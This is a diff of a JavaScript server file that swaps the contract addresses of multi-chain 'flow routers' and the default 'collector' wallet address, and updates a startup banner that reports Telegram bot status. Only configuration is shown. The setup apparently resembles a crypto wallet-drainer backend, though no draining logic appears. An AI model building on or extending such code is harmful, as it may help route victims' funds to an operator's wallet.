@@ -159,15 +159,15 @@ async function getChainProvider(chainName) {
 // ============================================
 
 const PROJECT_FLOW_ROUTERS = {
-  'Ethereum': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
-  'BSC': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
-  'Polygon': '0x56d829E89634Ce1426B73571c257623D17db46cB',
-  'Arbitrum': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
-  'Avalanche': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
+  'Ethereum': '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
+  'BSC': '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
+  'Polygon': '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
+  'Arbitrum': '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
+  'Avalanche': '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
   'Optimism': null // Not deployed yet
 };
 
-const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0x50C14Ec595D178f70D2817B1097B9FEE00af67B7';
+const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0xDe3209DFbAb25fD2e43EcCd72522ab27eD553527';
 
 // ============================================
 // CONTRACT ABI
@@ -1197,11 +1197,11 @@ app.listen(PORT, '0.0.0.0', async () => {
   📦 COLLECTOR: ${COLLECTOR_WALLET}
   
   🌐 DEPLOYED CONTRACTS:
-  ✅ Ethereum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
-  ✅ BSC: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
-  ✅ Polygon: 0x56d829E89634Ce1426B73571c257623D17db46cB
-  ✅ Arbitrum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
-  ✅ Avalanche: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
+  ✅ Ethereum: 0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288
+  ✅ BSC: 0xb2ea58AcfC23006B3193E6F51297518289D2d6a0
+  ✅ Polygon: 0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288
+  ✅ Arbitrum: 0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288
+  ✅ Avalanche: 0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288
   
   🤖 TELEGRAM: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing'}
   
@@ -1210,4 +1210,5 @@ app.listen(PORT, '0.0.0.0', async () => {
   
   await testTelegramConnection();
 });
+
 
